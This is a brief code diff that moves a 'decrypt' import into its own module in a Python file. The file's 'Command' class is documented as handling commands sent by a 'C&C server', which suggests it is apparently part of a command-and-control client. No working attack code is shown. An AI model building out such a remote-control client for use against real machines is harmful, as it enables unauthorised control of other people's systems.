@@ -5,7 +5,7 @@ import mimetypes
 # internal imports
 from utils.data_request_type import DataRequestType
 from utils.consts import DATA_CHUNK_SIZE
-from utils.consts import decrypt
+from utils.decrypt import decrypt
 
 class Command:
     """ A class for handling the command sent by the C&C server. """
